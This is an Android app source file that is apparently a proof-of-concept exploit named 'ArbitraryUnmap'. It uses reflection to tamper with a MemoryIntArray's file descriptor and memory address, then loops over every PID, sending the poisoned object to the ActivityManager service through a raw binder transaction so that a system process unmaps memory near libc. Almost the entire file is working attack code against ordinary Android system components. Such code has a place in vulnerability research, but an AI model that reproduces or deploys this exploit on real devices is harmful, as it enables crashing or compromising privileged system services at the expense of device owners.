package com.lulu.changxinlu.arbitraryunmap;

import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.ParcelFileDescriptor;
import android.os.Parcelable;
import android.support.v7.app.AppCompatActivity;
import android.system.Os;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileDescriptor;
import java.io.FileReader;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

import static android.system.OsConstants.O_RDWR;

public class MainActivity extends AppCompatActivity {

    // Used to load the 'native-lib' library on application startup.
    static {
        System.loadLibrary("native-lib");
    }

    private static final int ASHMEM_SIZE = 512;

    private static final int UNMAP_SIZE = 0x10000;

    private static final String TAG = "ArbitraryUnmap";

    private static final int CONVERT_TO_TRANSLUCENT_TRANSACTION = IBinder.FIRST_CALL_TRANSACTION+174;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Object instance = null;
        try {
            Class objClass = Class.forName("android.util.MemoryIntArray");
            instance = objClass.getDeclaredConstructor(int.class).newInstance(ASHMEM_SIZE);
        } catch (Exception e) {
            Log.e(TAG, "Unable to create instance", e);
        }

        long addr = findLibAddress("libc.so");
        try {
            int maxPid = getMaxPid();

            // Use for loop to trigger the vulns, otherwise the vulns will not be triggered
            for (int pid = 0; pid < maxPid; pid++)
                tryUnmap(instance, addr + ASHMEM_SIZE * 5, pid);
        } catch (Exception e) {
            Log.e(TAG, "PoC failed", e);
        }

    }


    private void tryUnmap(Object array, long actualSize, int pid) throws Exception{
        //Replacing the descriptor in the MemoryIntArray with a new controlled ashmem FD
        FileDescriptor desc = Os.open("/dev/ashmem", O_RDWR, 0);
        final int fd = (int)desc.getClass().getMethod("getInt$").invoke(desc);
        setAshmemSize(fd, ASHMEM_SIZE);
        Field parcelFdField = array.getClass().getDeclaredField("mFd");
        parcelFdField.setAccessible(true);
        ParcelFileDescriptor parcelFd = ParcelFileDescriptor.fromFd(fd);
        parcelFdField.set(array, fd);

        //Changing the PID to the given PID
        Field accessFlagsField = Field.class.getDeclaredField("accessFlags");
        accessFlagsField.setAccessible(true);

        //Changing the memory address to a chosen address
        Field memoryAddrField = array.getClass().getDeclaredField("mMemoryAddr");
        memoryAddrField.setAccessible(true);
        accessFlagsField.setInt(memoryAddrField, accessFlagsField.getInt(memoryAddrField) & ~Modifier.FINAL);
        memoryAddrField.setLong(array, actualSize);

        //Putting the poisoned object in a bundle
        final Bundle bundle = new Bundle(array.getClass().getClassLoader());
        bundle.putParcelable("obj", (Parcelable)array);

        //Sending out the poisoned request
        // Get ActivityManager binder
        IBinder amBinder = (IBinder)Class.forName("android.os.ServiceManager").getMethod("getService", String.class).invoke(null, "activity");

        // Two parcel instance one for send one for receive
        Parcel reply = Parcel.obtain();
        Parcel data = Parcel.obtain();

        // Validate the marshalled transaction is intended for the target interface
        data.writeInterfaceToken("android.app.IActivityManager");

        // Write a binder object to parcel
        data.writeStrongBinder((IBinder)this.getClass().getMethod("getActivityToken").invoke(this));
        data.writeInt(1); //is bundle present?
        data.writeBundle(bundle);
        try {
            amBinder.transact(CONVERT_TO_TRANSLUCENT_TRANSACTION, data, reply, 0);
        } catch (Exception ex) {}

        //Cleanup
        reply.recycle();
        data.recycle();
        Os.close(desc);
    }

    private native int setAshmemSize(int fd, int ashmemSize);

    private native long findLibAddress(String s);
    /**
     * A native method that is implemented by the 'native-lib' native library,
     * which is packaged with this application.
     */
    public native String stringFromJNI();

    public int getMaxPid() throws Exception{
        return Integer.parseInt(readFully(new File("/proc/sys/kernel/pid_max")).trim());
    }

    private String readFully(File file) throws Exception{
        StringBuilder builder = new StringBuilder();
        BufferedReader reader = null;
        try {
            reader = new BufferedReader(new FileReader(file));
            String line;
            while ((line = reader.readLine()) != null)
                builder.append(line).append('\n');
            return builder.toString();
        } finally {
            if (reader != null)
                try {
                    reader.close();
                } catch (IOException ex) {
                    //Nothing more we can do at this point
                }
        }
    }
}
